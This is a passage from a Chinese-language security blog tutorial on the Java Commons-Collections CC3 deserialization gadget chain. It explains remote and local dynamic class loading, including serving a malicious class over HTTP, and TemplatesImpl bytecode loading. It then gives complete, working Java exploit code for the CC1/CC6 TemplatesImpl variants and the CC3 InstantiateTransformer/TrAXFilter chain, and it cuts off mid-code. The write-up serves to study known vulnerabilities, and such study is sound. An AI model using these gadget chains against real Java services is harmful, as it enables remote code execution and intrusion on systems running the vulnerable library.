<p><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#5-%E6%9C%80%E7%BB%88%E4%B8%8D%E5%B8%A6-Transformer-%E6%95%B0%E7%BB%84%E7%9A%84-CC11-%E9%93%BE%E5%AD%90">Java反序列化Commons-Collections篇09-CC11链</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC3</title>
    <url>/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC1和CC2都是通过反序列化自动执行了object()方法最终导致了<code>InvokerTransformer.transform(Method.invoke())</code>的命令执行，那有没有一种可能，不通过<code>InvokerTransformer.transform(Method.invoke())</code>来进行命令执行？CC3给出了答案，CC3是通过JAVA的动态类加载机制来自动执行恶意类代码。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li><p>JDK8u65</p>
</li>
<li><p>Commons-Collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>  <br>     &lt;dependency&gt;<br>         &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>         &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>         &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>     &lt;/dependency&gt;<br>  <br> &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="JAVA动态类加载"><a href="#JAVA动态类加载" class="headerlink" title="JAVA动态类加载"></a>JAVA动态类加载</h2><h3 id="利用URLClassLoader加载class文件"><a href="#利用URLClassLoader加载class文件" class="headerlink" title="利用URLClassLoader加载class文件"></a>利用URLClassLoader加载class文件</h3><p>Java的<code>ClassLoader</code>来用来加载字节码文件最基础的方法，<code>ClassLoader </code>是什么呢？它就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的<code> ClassLoader</code> 就是根据类名来加载类，这个类名是类完整路径，如<code>java.lang.Runtime</code>。</p>
<p><code>URLClassLoader</code> 继承了<code>ClassLoader</code>也就是说<code>URLClassLoader</code>把<code>ClassLoader</code>扩展了一下，所以可以理解成<code>URLClassLoader</code>功能要多点。<code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader </code>的父类，所以，我们解释 <code>URLClassLoader </code>的工作过程实际上就是在解释默认的Java类加载器的工作流程。 </p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path </code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<ul>
<li><p>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader </code>来寻找类，即为在Jar包中寻 找.class文件。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 <code>FileLoader </code>来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类 我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。我们可以使用HTTP协议来测试一下，看Java是否能从远程HTTP服务器上加载.class文件。</p>
</li>
</ul>
<h4 id="http远程加载："><a href="#http远程加载：" class="headerlink" title="http远程加载："></a>http远程加载：</h4><p>我们编译一个恶意类，放在 <a href="http://localhost/Test.class">http://localhost/Test.class</a></p>
<p>(把编译好的class文件单独拿出来，放在另外一个目录，进入这个目录，利用python启动http服务就行<code>python -m http.server 80</code>)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234616607.png" alt="image-20240527234616607"></p>
<p> 成功请求到我们的 &#x2F;Test.class 文件，并执行了文件里的字节码。 所以，作为攻击者，如果我们能够控制目标<code> ClassLoader</code>的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528082827361.png" alt="image-20240528082827361"></p>
<h4 id="file本地加载"><a href="#file本地加载" class="headerlink" title="file本地加载:"></a>file本地加载:</h4><p>我们编译Test类，放在”C:\Users\Desktop” ，也是执行了文件里的字节码。他是则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻 找.class文件 。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234632078.png" alt="image-20240527234632078"></p>
<h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><p>前面我们认识到了如何利用<code>URLClassLoader</code>加载远程class文件，也就是字节码。其实，不管是加 载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用：</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528090248851.png" alt="image-20240528090248851"></p>
<ul>
<li>其中： <code>loadClass </code>的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行<code> findClass</code> 。</li>
<li><code>findClass</code> 的作用是根据基础URL指定的方式来加载类的字节码，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code>。</li>
<li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的Java类 。</li>
</ul>
<p>所以可见，真正核心的部分其实是 <code>defineClass</code> ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 <code>ClassLoader#defineClass </code>是一个native方法，逻辑在JVM的C语言代码中。 </p>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在<code> defineClass</code> 时也无法被直接调用到。所以，如果我们要使用 <code>defineClass</code> 在目标机器上执行任意代码，需要想办法调用构造函数。</p>
<p>（不进行初始化）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084507413.png" alt="image-20240528084507413"></p>
<p>（初始化）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084342573.png" alt="image-20240528084342573"></p>
<p>这里，因为系统的<code> ClassLoader#defineClass</code> 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用。 在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。</p>
<h2 id="TemplatesImpl-解析"><a href="#TemplatesImpl-解析" class="headerlink" title="TemplatesImpl 解析"></a>TemplatesImpl 解析</h2><p>我们知道defineClass()可以直接加载字节码，那我们可以像之前找CC链一样，反过去找谁调用了defineClass()，找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>下的<code>TemplatesImpl.TransletCLassLoader.defineClass()</code></p>
<p>JAVA中没有访问权限修饰词的是default类型，它可以访问在同一个包中的其他类的成员。	</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526215828567.png" alt="image-20240526215828567"></p>
<p>看哪调用了<code> defineClass</code>，看到还是同类<code>TemplatesImpl.defineTransletClasses()</code>调用了<code>defineClass </code>但还是private，又找哪里调用了<code>defineTransletClasses ()</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220246988.png" alt="image-20240526220246988"></p>
<p>找到了<code> TemplatesImpl.getTransletInstance()</code>，正好<code>newInstance()</code>,但是还是 private。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220419165.png" alt="image-20240526220419165"></p>
<p>最终找到了 <code>TemplatesImpl.newTransformer()</code>是public</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220516376.png" alt="image-20240526220516376"></p>
<p>正好这个类继承了Serializable接口，就很方便我们</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105116341.png" alt="image-20240527105116341"></p>
<p>调用链</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527154250480.png" alt="image-20240527154250480"></p>
<h3 id="实现TemplatesImpl的逻辑"><a href="#实现TemplatesImpl的逻辑" class="headerlink" title="实现TemplatesImpl的逻辑"></a>实现TemplatesImpl的逻辑</h3><p>按照上面的步骤代码其实就需要这两行，但是肯定这样是不能运行的。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105424926.png" alt="image-20240527105424926"></p>
<p>让我们跟进<code>TemplatesImpl()</code>，其实后面的不赋值，也能走到我们想要的<code>getTransletInstance()</code>，跟进<code>getTransletInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105723051.png" alt="image-20240527105723051"></p>
<p><code>_name</code>需要赋值</p>
<p><code>_class</code>不能赋值，因为我们就想调用<code>defineTransletClasses()</code></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p>随后代码会走到<code>_class[transletIndex].newInstance()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105855030.png" alt="image-20240527105855030"></p>
<p>跟进<code> defineTransletClasses()</code></p>
<p><code>_bytecodes</code>需要赋值</p>
<p><code>_tfactory</code>需要调方法，需要赋值,去看一下 <code>_tfactory</code>是什么</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110211207.png" alt="image-20240527110211207"></p>
<p>可以看到<code>_tfactory</code>是transient，也就是说它并不能序列化。这就很有意思了，要用但是不能序列化，那有可能在<code>readObect()</code>里面。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110600370.png" alt="image-20240527110600370"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110644855.png" alt="image-20240527110644855"></p>
<p>随后<code>defineClass(_bytecodes[i])</code>加载字节码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213049967.png" alt="image-20240527213049967"></p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p>其他的都很简单，唯一的难点是可能不知道这里为啥这样写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Tests.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br></code></pre></td></tr></table></figure>

<p>因为_bytecodes是一个二维数组</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213730267.png" alt="image-20240527213730267"></p>
<p>但是<code>defineClass()</code>接收一个一维数组</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213808776.png" alt="image-20240527213808776"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="空指针报错"><a href="#空指针报错" class="headerlink" title="空指针报错"></a>空指针报错</h3><p>遇到一个空指针错误</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527112539992.png" alt="image-20240527112539992"></p>
<p>这里打个断点调试一下</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527153320593.png" alt="image-20240527153320593"></p>
<p>可以看到这里空指针报错，看一下逻辑，就是要求<code>_bytecodes</code>父类为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>然后把i的值赋给<code>_transletIndex</code>  (_transletIndex默认为-1) ，否则就空指针报错。</p>
<p>当<code>_transletIndex</code>&lt;0也会报错。所以只能将父类改为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527170701421.png" alt="image-20240527170701421"></p>
<p>导入<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 发现需要实现两个接口</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527113056413.png" alt="image-20240527113056413"></p>
<p><code>TemplatesImpl</code>的所有逻辑就走完了</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240527173454095.png" alt="image-20240527173454095"></p>
<h2 id="CC1的TemplatesImpl-的实现方式"><a href="#CC1的TemplatesImpl-的实现方式" class="headerlink" title="CC1的TemplatesImpl 的实现方式"></a>CC1的TemplatesImpl 的实现方式</h2><p>没有什么特别的地方，本质上来讲就是换了一个执行命令的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//调用templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC1</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationdhdlerConstructor = c.getDeclaredConstructor(Class.class, 			Map.class);<br>        annotationInvocationdhdlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlerConstructor.newInstance(Target.class, transformedMap);<br><span class="hljs-comment">//        serialize(o);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC6的TemplatesImpl-的实现方式"><a href="#CC6的TemplatesImpl-的实现方式" class="headerlink" title="CC6的TemplatesImpl 的实现方式"></a>CC6的TemplatesImpl 的实现方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>		<span class="hljs-comment">//调用templates.newTransformer();</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>		<span class="hljs-comment">//CC6</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br><br><span class="hljs-comment">//        serialize(map2);</span><br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC3调用链分析"><a href="#CC3调用链分析" class="headerlink" title="CC3调用链分析"></a>CC3调用链分析</h2><p>因为只需要调用 <code>TemplatesImpl</code> 类的 <code>newTransformer()</code> 方法，便可以进行命令执行，所以我们，查找谁调用了 <code>newTransformer()</code> </p>
<p><code> com.sun.org.apache.xalan.internal.xslt.trax#TrAXFilter.TrAXFilter()</code>,因为<code>TrAXFilter()类的newTransformer()</code>在构造函数里面，方便我们传参，所以选择它，但有个问题，<code>TrAXFilter</code>类并没有继承<code>Serializable</code> 接口，不能序列化所以我们只能从<code>TrAXFilter</code>的Class入手。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528100031807.png" alt="image-20240528100031807"></p>
<p>CC3的作者没有调用 <code>InvokerTransformer</code>，而是调用了一个新的类 <code>InstantiateTransformer</code>。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528101227501.png" alt="image-20240528101227501"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240528111906340.png" alt="image-20240528111906340"></p>
<h3 id="CC3链EXP"><a href="#CC3链EXP" class="headerlink" title="CC3链EXP"></a>CC3链EXP</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\14341\\Desktop\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//    templates.newTransformer();</span><br>		<br>		<span class="hljs-comment">//为了调用Templates.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       <br>        instantiateTransformer.transform(TrAXFilter.class);<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="CC1实现CC3完整版"><a href="#CC1实现CC3完整版" class="headerlink" title="CC1实现CC3完整版"></a>CC1实现CC3完整版</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        